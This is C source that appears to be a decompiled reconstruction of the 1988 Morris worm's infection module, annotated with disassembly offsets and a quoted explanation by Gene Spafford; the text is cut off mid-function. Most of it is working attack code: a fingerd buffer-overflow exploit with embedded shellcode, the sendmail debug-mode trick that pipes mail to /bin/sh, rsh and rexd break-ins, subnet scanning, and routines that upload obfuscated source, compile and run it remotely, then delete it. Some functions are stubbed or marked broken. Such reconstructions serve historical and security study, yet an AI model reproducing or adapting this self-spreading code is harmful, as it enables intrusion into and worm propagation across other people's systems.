/* dover */

#include "worm.h"
#include <stdio.h>
#include <strings.h>
#include <signal.h>
#include <errno.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <string.h>

extern struct hst *h_addr2host(), *h_name2host();
extern int errno;

int alarmed = 0;
int ngateways, *gateways;
struct hst *me, *hosts;

int nifs;
struct ifses ifs[30];				/*  Arbitrary number, fix */

static int command_port_p(u_long addr, int time);
static int try_telnet_p(u_long addr);
static int try_rsh_and_mail(struct hst *host);
static int talk_to_sh(struct hst *host, int fdrd, int fdwr);
static int compile_slave(struct hst *host, int s, int arg16, int arg20, int arg24);
static ssize_t send_text(int fd, char *str);
static int fork_rsh(char *host, int *fdp1, int *fdp2, char *str);
static int wait_for(int fd, char *str, int time);
static int test_connection(int rdfd, int wrfd, int time);
static int x488e(int fd, char *buf, int num_chars, int maxtime);
static char *movstr(char *arg0, char *arg1);
static int try_finger(struct hst *host, int *fd1, int *fd2);
static int byte_swap(int arg);
static int try_mail(struct hst *host);
static int x50bc(/*socket*/int s, char *buffer);
static int x538e(struct hst *host, char *name1, char *name2);
static void answer_other();

/* Clean hosts not contacted from the host list. */
void h_clean()					/* 0x31f0 */
{
    struct hst *newhosts, *host, *next;
    
    newhosts = NULL;
    for (host = hosts; host != NULL; host = next) {
	next = host->next;
	host->flag &= -7;
	if (host == me || host->flag != 0) {
	    host->next = newhosts;
	    newhosts = host;
	} else
	    free(host);
    }
    hosts = newhosts;
}

/* Look for a gateway we can contact. */
int hg()				/* 0x3270, check again */
{
    struct hst *host;
    int i;
    
    rt_init();
    
    for (i = 0; i < ngateways; i++) {		/* 24, 92 */
	host = h_addr2host(gateways[i], 1);
	if (try_rsh_and_mail(host))
	    return 1;
    }
    return 0;
}

int ha()						/* 0x32d4, unchecked */
{
    struct hst *host;
    int i, j, k;
    int l416[100];
    int l420;
    
    if (ngateways < 1)
	rt_init();
    j = 0;
    for (i = 0; i < ngateways; i++) {		/* 40, 172 */
	host = h_addr2host(gateways[i], 1);
	for (k = 0; k < 6; k++) {		/* 86, 164 */
	    if (host->o48[k] == 0)
		continue;			/* 158 */
	    if (try_telnet_p(host->o48[k]) == 0)
		continue;
	    l416[j] = host->o48[k];
	    j++;
	}
    }
    
    permute(l416, j, sizeof(l416[0]));
    
    for (i = 0; i < j; i++) {			/* 198, 260 */
	if (hi_84(l416[i] & netmaskfor(l416[i])))
	    return 1;
    }
    return 0;
}

int hl()						/* 0x33e6 */
{
    int i;
    
    for (i = 0; i < 6; i++) {			/* 18, 106 */
	if (me->o48[i] == 0)
	    break;
	if (hi_84(me->o48[i] & netmaskfor(me->o48[i])) != 0)
	    return 1;
    }
    return 0;
}

int hi()						/* 0x3458 */
{
    struct hst *host;
    
    for (host = hosts; host; host = host->next )
	if ((host->flag & 0x08 != 0) && (try_rsh_and_mail(host) != 0))
	    return 1;
    return 0;
}

int hi_84(int arg1)					/* 0x34ac */
{
    int l4;
    struct hst *host;
    int l12, l16, l20, i, l28, adr_index, l36, l40, l44;
    int netaddrs[2048];
    
    l12 = netmaskfor(arg1);
    l16 = ~l12;
    
    for (i = 0; i < nifs; i++) {		/* 128,206 */
	if (arg1 == (ifs[i].if_l24 & ifs[i].if_l16))
	    return 0;				/* 624 */
    }
    
    adr_index = 0;
    if (l16 == 0x0000ffff) {			/* 330 */
	l44 = 4;
	for (l40 = 1; l40 < 255; l40++)		/* 236,306 */
	    for (l20 = 1; l20 <= 8; l20++)	/* 254,300 */
		netaddrs[adr_index++] = arg1 | (l20 << 16) | l40;
	permute(netaddrs, adr_index, sizeof(netaddrs[0]));
    } else {					/* 432 */
	l44 = 4;
	for (l20 = 1; l20 < 255; l20++)
	    netaddrs[adr_index++] = (arg1 | l20);
	permute(netaddrs, 3*sizeof(netaddrs[0]), sizeof(netaddrs[0]));
	permute(netaddrs, adr_index - 6, 4);
    }
    if (adr_index > 20)
	adr_index = 20;
    for (l36 = 0; l36 < adr_index; l36++) {	/* 454,620 */
	l4 = netaddrs[l36];
	host = h_addr2host(l4, 0);
	if (host == NULL || (host->flag & 0x02) == 0)
	    continue;
	if (host == NULL || (host->flag & 0x04) == 0 ||
	    command_port_p(l4, l44) == 0)
	    continue;
	if (host == NULL)
	    host = h_addr2host(l4, 1);
	if (try_rsh_and_mail(host))
	    return 1;
    }
    return 0;
}

/* Only called in the function above */
static int command_port_p(u_long addr, int time) /* x36d2, <hi+634> */
{
    int s, connection;				 /* 28 */
    struct sockaddr_in sin;                      /* 16 bytes */
    void (*save_sighand)();
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return 0;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = addr;
    sin.sin_port = IPPORT_CMDSERVER;             /* Oh no, not the command server... */
    
    save_sighand = signal(SIGALRM, justreturn);	 /* Wakeup if it fails */
    
    /* Set up a timeout to break from connect if it fails */
    if (time < 1)
	time = 1;
    alarm(time);
    connection = connect(s, (struct sockaddr *)&sin, sizeof(sin));
    alarm(0);
    
    close(s);
    
    if (connection < 0 && errno == ENETUNREACH)
	perror("Network unreachable");
    return connection != -1;
}

static int try_telnet_p(u_long addr)               /* x37b2 <hi+858>, checked */
{
    int s, connection;                             /* 28 */
    struct sockaddr_in sin;                        /* 16 bytes */
    void (*save_sighand)();
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return 0;
    bzero(&sin, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = addr;
    sin.sin_port = IPPORT_TELNET;                  /* This time try telnet... */
    
    // Set up a 5 second timeout, break from connect if it fails
    save_sighand = signal(SIGALRM, justreturn);
    alarm(5);
    connection = connect(s, (struct sockaddr *)&sin, sizeof(sin));
    if (connection < 0  &&  errno == ECONNREFUSED) /* Telnet connection refused */
	connection = 0;
    alarm(0);                                      /* Turn off timeout */
    
    close(s);
    
    return connection != -1;
}

/* Used in hg(), hi(), and hi_84(). */
static int try_rsh_and_mail(struct hst *host) /* x3884, <hi+1068> */
{
    int fd1, fd2, result;
    
    if (host == me)
	return 0;			      /* 1476 */
    if (host->flag & 0x02)
	return 0;
    if (host->flag & 0x04)
	return 0;
    if (host->o48[0] == 0 || host->hostname == NULL)
	getaddrs(host);
    if (host->o48[0] == 0) {
	host->flag |= 0x04;
	return 0;
    }
    other_sleep(1);
    if (host->hostname  &&                    /* 1352 */
	fork_rsh(host->hostname, &fd1, &fd2,
	      XS("exec /bin/sh"))) {	      /* <env+188> */
	result = talk_to_sh(host, fd1, fd2);
	close(fd1);
	close(fd2);
	// Prevent child from hanging around in the <exiting> state
	wait3((int *)NULL, WNOHANG, (struct rusage *)NULL);
	if (result != 0)
	    return result;
    }
    
    if (try_finger(host, &fd1, &fd2)) {		/* 1440 */
	result = talk_to_sh(host, fd1, fd2);
	close(fd1);
	close(fd2);
	if (result != 0)
	    return result;
    }
    if (try_mail(host))
	return 1;
    
    host->flag |= 4;
    return 0;
}


/* Check a2in() as it is updated */
/* Used in twice in try_rsh_and_mail(), once in hu1(). */
static int talk_to_sh(struct hst *host, int fdrd, int fdwr) /* x3a20, Checked, changed <hi+
>*/
{
    object *objectptr;
    char send_buf[512];				/* l516 */
    char print_buf[52];				/* l568 */
    int l572, l576, l580, l584, l588,  l592;
    
    objectptr = getobjectbyname(XS("l1.c"));	/* env 200c9 */
    
    if (objectptr == NULL)
	return 0;				/* <hi+2128> */
    if (makemagic(host, &l592, &l580, &l584, &l588) == 0)
	return 0;
    send_text(fdwr, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
    send_text(fdwr, XS("cd /usr/tmp\n"));
    l576 = random() % 0x00FFFFFF;
    
    sprintf(print_buf, XS("x%d.c"), l576);
    /* The 'sed' script just puts the EOF on the transmitted program. */
    sprintf(send_buf, XS("echo gorch49;sed \'/int zz;/q\' > %s;echo gorch50\n"
),
	    print_buf);
    
    send_text(fdwr, send_buf);
    
    wait_for(fdrd, XS("gorch49"), 10);
    
    xorbuf(objectptr->buf, objectptr->size);
    l572 = write(fdwr, objectptr->buf, objectptr->size);
    xorbuf(objectptr->buf, objectptr->size);
    
    if (l572 != objectptr->size) {
	close(l588);
	return 0;				/* to <hi+2128> */
    }
    send_text(fdwr, XS("int zz;\n\n"));
    wait_for(fdrd, XS("gorch50"), 30);
    
#define COMPILE  "cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"
    sprintf(send_buf, XS(COMPILE), l576, l576, l576,
	    inet_ntoa(*a2in(l592)), l580, l584, l576, l576);
    
    
    send_text(fdwr, send_buf);
    
    if (wait_for(fdrd, XS("DONE"), 100) == 0) {
	close(l588);
	return 0;				/* <hi+2128> */
    }
    return waithit(host, l592, l580, l584, l588);
}

int makemagic(struct hst *arg8, int *arg12, int *arg16, int *arg20, int *arg24) /* checked */
{
    int s, i, namelen;
    struct sockaddr_in sin0, sin1;		/* 16 bytes */
    
    *arg20 = random() & 0x00ffffff;
    bzero(&sin1, sizeof(sin1));
    sin1.sin_addr.s_addr = me->l12;
    
    for (i= 0; i < 6; i++) {			/* 64, 274 */
	if (arg8->o48[i] == /*NULL*/0)
	    continue;				/* 266 */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
	    return 0;				/* 470 */
	bzero(&sin0, sizeof(sin0));
	sin0.sin_family = AF_INET;
	sin0.sin_port = IPPORT_TELNET;
	sin0.sin_addr.s_addr = arg8->o48[i];
	errno = 0;
	if (connect(s, (struct sockaddr *)&sin0, sizeof(sin0)) != -1) {
	    namelen = sizeof(sin1);
	    getsockname(s, (struct sockaddr *)&sin1, &namelen);
	    close(s);
	    break;
	}
	close(s);
    }
    
    *arg12 = sin1.sin_addr.s_addr;
    
    for (i = 0; i < 1024; i++) {		/* 286,466 */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
	    return 0;				/* 470 */
	bzero(&sin0, sizeof(sin0));
	sin0.sin_family = AF_INET;
	sin0.sin_port = random() % 0xffff;
	if (bind(s, (struct sockaddr *)&sin0, sizeof(sin0)) != -1) {
	    listen(s, 10);
	    *arg16 = sin0.sin_port;
	    *arg24 = s;
	    return 1;
	}
	close(s);
    }
    
    return 0;
}

/* Check for somebody connecting. 
 * If there is a connection and he has the right key, send out the a complete set
 * of encoded objects to it. 
 */
int waithit(struct hst *host, int arg1, int arg2, int key, int arg4)		/* 0x3e86 */
{
    void (*save_sighand)();
    int l8, sin_size, l16, i, l24, l28;
    struct sockaddr_in sin;			/* 44 */
    object *obj;
    char files[20][128];			/* File list, 2608 */
    char *l2612;
    char strbuf[512];
    
    save_sighand = signal(SIGPIPE, justreturn);
    
    sin_size = sizeof(sin);
    alarm(2*60);
    l8 = accept(arg4, (struct sockaddr *)&sin, &sin_size);
    alarm(0);
    
    if (l8 < 0)
	goto quit;				/* 1144 */
    if (xread(l8, (char *)&l16, sizeof(l16), 10) != 4)
	goto quit;
    l16 = ntohl(l16);
    if (key != l16)
	goto quit;
    for (i = 0; i < nobjects; i++) {	/* 164,432 */
	obj = &objects[i];
	l16 = htonl(obj->size);
	write(l8, &l16, sizeof(l16));
	sprintf(files[i], XS("x%d,%s"),
		(random()&0x00ffffff), obj->name);
	write(l8, files[i], sizeof(files[0]));
	xorbuf(obj->buf, obj->size);
	l24 = write(l8, obj->buf, obj->size);
	xorbuf(obj->buf, obj->size);
	if (l24 != obj->size)
	    goto quit;
    }
    
    /* Get rid of my client's key, and tell him the list has ended. */
    l16 = -1;
    if (write(l8, &l16, sizeof(l16)) != 4)
	goto quit;
    
    /* Don't run up the load average too much... */
    sleep(4);
    
    if (test_connection(l8, l8, 30) == 0)
	goto quit;
    send_text(l8, XS("PATH=/bin:/usr/bin:/usr/ucb\n"));
    send_text(l8, XS("rm -f sh\n"));
    
    sprintf(strbuf, XS("if [ -f sh ]\nthen\nP=x%d\nelse\nP=sh\nfi\n"),
	    random()&0x00ffffff);
    send_text(l8, strbuf);
    
    for (i = 0; i < nobjects; i++) {	/* 636,1040 */
	if ((l2612 = index(files[i], '.')) == NULL ||
	    l2612[1] != 'o')
	    continue;
	sprintf(strbuf, XS("cc -o $P %s\n"), files[i]);
	send_text(l8, strbuf);
	if (test_connection(l8, l8, 30) == 0)
	    goto quit;				/* 1144 */
	sprintf(strbuf, XS("./$P -p $$ "));
	for(l28 = 0; l28 < nobjects; l28++) {	/* 820,892 */
	    strcat(strbuf, files[l28]);
	    strcat(strbuf, XS(" "));
	}
	strcat(strbuf, XS("\n"));
	send_text(l8, strbuf);
	if (test_connection(l8, l8, 10) == 0) {
	    close(l8);
	    close(arg4);
	    host->flag |= 2;
	    return 1;				/* 1172 */
	}
	send_text(l8, XS("rm -f $P\n"));
    }
    
    for (i = 0; i < nobjects; i++) {	/* 1044,1122 */
	sprintf(strbuf, XS("rm -f %s $P\n"), files[i]);
	send_text(l8, strbuf);
    }
    test_connection(l8, l8, 5);
 quit:
    close(l8);
    close(l24);
    return 0;
}

/* Only called from within mail */
static int compile_slave(struct hst *host, int s,
                         // FIXME: types
                         int arg16, int arg20, int arg24) /* x431e, <waithit+1176> */
{     
    object *obj;
    char buf[512];				/* 516 */
    char cfile[56];				/* 568 */
    int wr_len, key;				/* might be same */
    
    obj = getobjectbyname(XS("l1.c"));
    if (obj == NULL)
	return 0;				/* 1590 */
    send_text(s, XS("cd /usr/tmp\n"));
    
    key = (random() % 0x00ffffff);
    sprintf(cfile, XS("x%d.c"), key);
    sprintf(buf, XS("cat > %s <<\'EOF\'\n"), cfile);
    send_text(s, buf);
    
    xorbuf(obj->buf, obj->size);
    wr_len = write(s, obj->buf, obj->size);
    xorbuf(obj->buf, obj->size);
    
    if (wr_len != obj->size)
	return 0;
    send_text(s, XS("EOF\n"));
    
    sprintf(buf, XS("cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c\n"),
	    key, key, key,
            // FIXME:
            // inet_ntoa(a2in(arg16, arg20, arg24, key, key)->s_addr));
            inet_ntoa(*a2in(arg16)));
    return send_text(s, buf);
}

static ssize_t send_text(int fd, char *str)			/* 0x44c0, <waithit+1594> */
{
    return write(fd, str, strlen(str));
}

/* Used in try_rsh_and_mail(). */
static int fork_rsh(char *host, int *fdp1, int *fdp2, char *str)		/* 0x44f4, <waithit+1646> */
{
    int child;					/* 4 */
    int fildes[2];				/* 12 */
    int fildes1[2];				/* 20 */
    int fd;
    
    if (pipe(fildes) < 0)
	return 0;
    if (pipe(fildes1) < 0) {
	close(fildes[0]);
	close(fildes[1]);
	return 0;
    }
    
    child = fork();
    if (child < 0) {				/* 1798 */
	close(fildes[0]);
	close(fildes[1]);
	close(fildes1[0]);
	close(fildes1[1]);
	return 0;
    }
    if (child == 0) {				/* 2118 */
	for (fd = 0; fd < 32; fd++)
	    if (fd != fildes[0] &&
		fd != fildes1[1] &&
		fd != 2)
		close(fd);
	dup2(fildes[0], 0);
	dup2(fildes[1], 1);
	if (fildes[0] > 2)
	    close(fildes[0]);
	if (fildes1[1] > 2)
	    close(fildes1[1]);
	/* 'execl()' does not return if it suceeds. */
	execl(XS("/usr/ucb/rsh"), XS("rsh"), host, str, 0);
	execl(XS("/usr/bin/rsh"), XS("rsh"), host, str, 0);
	execl(XS("/bin/rsh"), XS("rsh"), host, str, 0);
	exit(1);
    }
    close(fildes[0]);
    close(fildes1[1]);
    *fdp1 = fildes1[0];
    *fdp2 = fildes[1];
    
    if (test_connection(*fdp1, *fdp2, 30))
	return 1;				/* Sucess!!! */
    close(*fdp1);
    close(*fdp2);
    kill(child, 9);
    /* Give the child a chance to die from the signal. */
    sleep(1);
    wait3(0, WNOHANG, 0);
    return 0;
}

static int test_connection(int rdfd, int wrfd, int time) /* x476c,<waithit+2278> */
{
    char combuf[100], numbuf[100];
    
    sprintf(numbuf, XS("%d"), random() & 0x00ffffff);
    sprintf(combuf, XS("\n/bin/echo %s\n"), numbuf);
    send_text(wrfd, combuf);
    return wait_for(rdfd, numbuf, time);
}

static int wait_for(int fd, char *str, int time)			/* <waithit+2412> */
{
    char buf[512];
    int i, length;
    
    length = strlen(str);
    while (x488e(fd, buf, sizeof(buf), time) == 0) { /* 2532 */
	for(i = 0; buf[i]; i++) {
	    if (strncmp(str, &buf[i], length) == 0)
		return 1;
	}
    }
    return 0;
}

/* Installed as a signal handler */
void justreturn(int sig) //, int code, struct sigcontext *scp) /* 0x4872 */
{
    alarmed = 1;
}

static int x488e(int fd, char *buf, int num_chars, int maxtime)
{	
    
    int i, l8, readfds;
    struct timeval timeout;
    
    for (i = 0; i < num_chars; i++) {		/* 46,192 */
	readfds = 1 << fd;
	timeout.tv_usec = maxtime;
	timeout.tv_sec = 0;
	if (select(fd + 1, &readfds, 0, 0, &timeout) <= 0)
	    return 0;
	if (readfds == 0)
	    return 0;
	if (read(fd, &buf[i], 1) != 1)
	    return 0;
	if (buf[i] == '\n')
	    break;
    }
    buf[i] = '\0';
    if (i > 0 && l8 > 0)
	return 1;
    return 0;
}

/* This doesn't appear to be used anywhere??? */
static char *movstr(char *arg0, char *arg1) /* 0x4958,<just_return+
230> */
{
    arg1[0] = '\0';
    if (arg0 == 0)
	return 0;
    while( ! isspace(*arg0))
	arg0++;

    if (*arg0 == '\0')
        return 0;
    while(*arg0) {
	if (isspace(*arg0)) break;
	*arg1++ = *arg0++;
    }
    *arg1 = '\0';
    return arg0;
}

/* 
   From Gene Spafford <spaf@perdue.edu>
   What this routine does is actually kind of clever.  Keep in
   mind that on a Vax the stack grows downwards.

   fingerd gets its input via a call to gets, with an argument
   of an automatic variable on the stack.  Since gets doesn't
   have a bound on its input, it is possible to overflow the
   buffer without an error message.  Normally, when that happens
   you trash the return stack frame.  However, if you know
   where everything is on the stack (as is the case with a
   distributed binary like BSD), you can put selected values
   back in the return stack frame.

   This is what that routine does.  It overwrites the return frame
   to point into the buffer that just got trashed.  The new code
   does a chmk (change-mode-to-kernel) with the service call for
   execl and an argument of "/bin/sh".  Thus, fingerd gets a
   service request, forks a child process, tries to get a user name
   and has its buffer trashed, does a return, exec's a shell,
   and then proceeds to take input off the socket -- from the
   worm on the other machine.  Since many sites never bother to
   fix fingerd to run as something other than root.....

   Luckily, the code doesn't work on Suns -- it just causes it
   to dump core.

   --spaf
*/    

/* This routine exploits a fixed 512 byte input buffer in a VAX running
 * the BSD 4.3 fingerd binary.  It send 536 bytes (plus a newline) to
 * overwrite six extra words in the stack frame, including the return
 * PC, to point into the middle of the string sent over.  The instructions
 * in the string do the direct system call version of execve("/bin/sh"). */

static int try_finger(struct hst *host, int *fd1, int *fd2) /* 0x49ec,<just_return+378 */
{
    int i, j, l12, l16, s;
    struct sockaddr_in sin;			/* 36 */
    char unused[492];
    int l552, l556, l560, l564, l568;
    char buf[536];				/* 1084 */
    void (*save_sighand)();			/* 1088 */

    save_sighand = signal(SIGALRM, justreturn);

    for (i = 0; i < 6; i++) {			/* 416,608 */
	if (host->o48[i] == 0)
	    continue;				/* 600 */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
	    continue;
	bzero(&sin, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = host->o48[i];
	sin.sin_port = IPPORT_FINGER;

	alarm(10);
	if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
	    alarm(0);
	    close(s);
	    continue;
	}
	alarm(0);
	break;
    }
    if (i >= 6)
	return 0;				/* 978 */
    for(i = 0; i < 536; i++)			/* 628,654 */
	buf[i] = '\0';
    for(i = 0; i < 400; i++)
	buf[i] = 1;
    for(j = 0; j < 28; j++)
	buf[i+j] = "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"[j];		
	/* constant string x200a0 */

    /* 0xdd8f2f73,0x6800dd8f,0x2f62696e,0xd05e5add,0x00dd00dd,0x5add03d0,0x5e5cbc3b */
    /* "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"... */

    l556 = 0x7fffe9fc;				/* Rewrite part of the stack frame */
    l560 = 0x7fffe8a8;
    l564 = 0x7fffe8bc;
    l568 = 0x28000000;
    l552 = 0x0001c020;

#ifdef sun
    l556 = byte_swap(l556);			/* Reverse the word order for the */
    l560 = byte_swap(l560);			/* VAX (only Suns have to do this) */
    l564 = byte_swap(l564);
    l568 = byte_swap(l568);
    l552 = byte_swap(l552);
#endif /*sum*/

    write(s, buf, sizeof(buf));			/* sizeof == 536 */
    write(s, XS("\n"), 1);
    sleep(5);
    if (test_connection(s, s, 10)) {
	*fd1 = s;
	*fd2 = s;
	return 1;
    }
    close(s);
    return 0;
}

static int byte_swap(int arg) /* 0x4c48,<just_return+982 */
{
    int i, j;

    i = 0;
    j = 0;
    while (j < 4) {
	i = i << 8;
	i |= (arg & 0xff);
	arg = arg >> 8;
	j++;
    }
    return i;
}

void permute(int *ptr, int num, int size)			/* 0x4c9a */
{
    int i, newloc;
    char buf[512];

    for (i = 0; i < num*size; i+=size) {	/* 18,158 */
	newloc = size * (random() % num);
	bcopy(ptr+i, buf, size);
	bcopy(ptr+newloc, ptr+i, size);
	bcopy(buf, ptr+newloc, size);
    }
}


/* Called from try_rsh_and_mail() */
static int try_mail(struct hst *host)  /* x4d3c <permute+162>*/
{
    int i, l8, l12, l16, s;
    struct sockaddr_in sin;			/* 16 bytes */
    char l548[512];
    void (*old_handler)();
    struct sockaddr saddr;			/* Not right */
    int key;
    int fd_tmp;					/* ???  part of saddr */
    
    if (makemagic(host, /*???*/&key, &l8, &l12, &l16) == 0)
	return 0;				/* <permute+1054> */
    old_handler = signal(SIGALRM, justreturn);
    for( i = 0; i < 6; i++) {			/* to 430 */
	if (host->o48[i] == NULL)
	    continue;				/* to 422 */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
	    continue;				/* to 422 */
	
	bzero(&sin, sizeof(sin));		/* 16 */
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = host->o48[i];
	sin.sin_port = IPPORT_SMTP;
	
	alarm(10);
	if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
	    alarm(0);
	    close(s);
	    continue;				/* to 422 */
	}
	alarm(0);
	break;
    }
    
    if (i < 6)
	return 0;				/* 1054 */
    if (x50bc( s, l548) != 0 || l548[0] != '2')
	goto bad;
    
    send_text(s, XS("debug"));		/* "debug" */
    if (x50bc( s, l548) != 0 || l548[0] != '2')
	goto bad;
    
#define MAIL_FROM "mail from:</dev/null>\n"
#define MAIL_RCPT "rcpt to:<\"| sed \'1,/^$/d\' | /bin/sh ; exit 0\">\n"
    
    send_text(s, XS(MAIL_FROM));
    if (x50bc( s, l548) != 0 || l548[0] != '2')
	goto bad;
    i = (random() & 0x00FFFFFF);
    
    sprintf(l548, XS(MAIL_RCPT), i, i);
    send_text(s, l548);
    if (x50bc( s, l548) != 0 || l548[0] != '2')
	goto bad;
    
    send_text(s, XS("data\n"));
    if (x50bc( s, l548) == 0 || l548[0] != '3')
	goto bad;
    
    send_text(s, XS("data\n"));
    
    compile_slave(host, s, l8, l12, l16); //saddr);
    
    send_text(s, XS("\n.\n"));
    
    if (x50bc( s, l548) == 0 || l548[0] != '2') {
	close(fd_tmp);				/* This isn't set yet!!! */
	goto bad;
    }
    
    send_text(s, XS("quit\n"));
    if (x50bc( s, l548) == 0 || l548[0] != '2') {
	close(fd_tmp);				/* This isn't set yet!!! */
	goto bad;
    }
    
    close(s);
    return waithit(host, l8, l12, i, l16);
 bad:
    send_text(s, XS("quit\n"));
    x50bc(s, l548);
    close(s);
    return 0;
}

/* Used only in try_mail() above.  This fills buffer with a line of the response */
static int x50bc(/*socket*/int s, char *buffer) /* x50bc, <permute+1058> */
{
    /* Fill in exact code later.  It's pretty boring. */
}


/*
 * I call this "huristic 1". It tries to breakin using the remote execution
 * service.  It is called from a subroutine of cracksome_1 with information from
 * a user's .forword file.  The two name are the original username and the one
 * in the .forward file.
 */
int hu1(char *alt_username, struct hst *host, char *username2)		/* x5178 */
{
    char username[256];
    char buffer2[512];
    char local[8];
    int result, i, fd_for_sh;			/* 780, 784, 788 */
    
    if (host == me)
	return 0;				/* 530 */
    if (host->flag & HST_HOSTTWO)			/* Already tried ??? */
	return 0;
    
    if (host->o48[0] || host->hostname == NULL)
	getaddrs(host);
    if (host->o48[0] == 0) {
	host->flag |= HST_HOSTFOUR;
	return 0;
    }
    strncpy(username, username2, sizeof(username)-1);
    username[sizeof(username)-1] = '\0';
    
    if (username[0] == '\0')
	strcpy(username, alt_username);
    
    for (i = 0; username[i]; i++)
	if (ispunct(username[i]) || username[i] < ' ')
	    return 0;
    other_sleep(1);
    
    fd_for_sh = x538e(host, username, &alt_username[30]);
    if (fd_for_sh >= 0) {
	result = talk_to_sh(host, fd_for_sh, fd_for_sh);
	close(fd_for_sh);
	return result;
    }
    if (fd_for_sh == -2)
	return 0;
    
    fd_for_sh = x538e(me, alt_username, &alt_username[30]);
    if (fd_for_sh >= 0) {
	sprintf(buffer2, XS("exec /usr/ucb/rsh %s -l %s \'exec /bin/sh\'\n"),
		host->hostname, username);
	send_text(fd_for_sh, buffer2);
	sleep(10);
	result = 0;
	if (test_connection(fd_for_sh, fd_for_sh, 25))	/* 508 */
	    result = talk_to_sh(host, fd_for_sh, fd_for_sh);
	close(fd_for_sh);
	return result;
    }
    return 0;
}

/* 
 * Used in hu1.  Returns a file descriptor.
 * It goes through the six connections in host trying to connect to the
 * remote execution server on each one.
 */
static int x538e(struct hst *host, char *name1, char *name2)
{
    int s, i;
    struct sockaddr_in sin;			/* 16 bytes */
    int l6, l7;
    char in_buf[512];
    
    for (i = 0; i < 6; i++) {			/* 552,762 */
	if (host->o48[i] == 0)
	    continue;				/* 754 */
	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s < 0)
	    continue;
	
	bzero(&sin, sizeof(sin));		/* 16 */
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = host->o48[i];
	sin.sin_port = IPPORT_EXECSERVER;	/* Oh shit, looking for rexd */
	
	alarm(8);
	signal(SIGALRM, justreturn);
	if (connect(s, &sin, sizeof(sin)) < 0) {
	    alarm(0);
	    close(s);
	    continue;
	}
	alarm(0);
	break;
    }
    if (i >= 6)
	return -2;				/* 1048 */
    /* Check out the connection by writing a null */
    if (write(s, XS(""), 1) == 1) {
	/* Tell the remote execution deamon the hostname, username, and to star
tup
	   "/bin/sh". */
	write(s, name1, strlen(name1) + 1);
	write(s, name2, strlen(name2) + 1);
	if ((write(s, XS("/bin/sh"), strlen(XS("/bin/sh"))+1) >= 0) &&
	    xread(s, in_buf, 1, 20) == 1  &&
	    in_buf[0] == '\0' &&
	    test_connection(s, s, 40) != 0)
	    return s;
    }
    close(s);
    return -1;
}

/* Reads in a file and puts it in the 'objects' array. Returns 1 if sucessful, 0
 * if not. */
int loadobject(char *obj_name)				/* x5594 */
{
    int fd;
    unsigned long size;
    struct stat statbuf;
    char *object_buf, *suffix;
    char local[4];
    
    fd = open(obj_name, O_RDONLY);
    if (fd < 0)
	return 0;				/* 378 */
    if (fstat(fd, &statbuf) < 0) {
	close(fd);
	return 0;
    }
    size = statbuf.st_size;
    object_buf = malloc(size);
    if (object_buf == 0) {
	close(fd);
	return 0;
    }
    if (read(fd, object_buf, size) != size) {
	free(object_buf);
	close(fd);
	return 0;
    }
    close(fd);
    xorbuf(object_buf, size);
    suffix = index(obj_name, ',');
    if (suffix != NULL)
	suffix+=1;
    else
	suffix = obj_name;
    objects[nobjects].name = strcpy(malloc(strlen(suffix)+1), suffix);
    objects[nobjects].size = size;
    objects[nobjects].buf = object_buf;
    nobjects += 1;
    return 1;
}

/* Returns the object from the 'objects' array that has name, otherwise NULL. */
object *getobjectbyname(char *name) {
    for (int i = 0; i < nobjects; i++)
	if (strcmp(name, objects[i].name) == 0)
	    return &objects[i];
    return NULL;
}

/* Encodes and decodes the binary coming over the socket. */
void xorbuf(char *buf, unsigned long size)				/* 0x577e */
{
    char *addr_self;			/* The address of the xorbuf fuction */
    int i;
    
    addr_self = (char *)xorbuf;
    i = 0; 
    while (size-- > 0) {
	*buf++ ^= addr_self[i];
	i = (i+1) % 10;
    }
    return;
}


static other_fd = -1;

/* 
 * Make a connection to the local machine and see if I'm running in
 * another process by sending a magic number on a random port and waiting
 * five minutes for a reply. 
 */
void checkother()					/* 0x57d0 */
{
    int s, l8, l12, l16, optval;
    struct sockaddr_in sin;			/* 16 bytes */
    
    optval = 1;
    if ((random() % 7) == 3)
	return;					/* 612 */
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return;
    
    /* Make a socket to the localhost, using a link-time specific port */
    bzero(&sin, sizeof(sin));		/* 16 */
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(XS("127.0.0.1")); /* <other_fd+4> */
    sin.sin_port = 0x00005b3d;			/* ??? */
    
    if (connect(s, &sin, sizeof(sin)) < 0) {
	close(s);
    } else {
	l8 = MAGIC_2;			/* Magic number??? */
	if (write(s, &l8, sizeof(l8)) != sizeof(l8)) {
	    close(s);
	    return;
	}
	l8 = 0;
	if (xread(s, &l8, sizeof(l8), 5*60) != sizeof(l8)) {
	    close(s);
	    return;
	}
	if (l8 != MAGIC_1) {
	    close(s);
	    return;
	}
	
	l12 = random()/8;
	if (write(s, &l12, sizeof(l12)) != sizeof(l12)) {
	    close(s);
	    return;
	}
	
	if (xread(s, &l16, sizeof(l16), 10) != sizeof(l16)) {
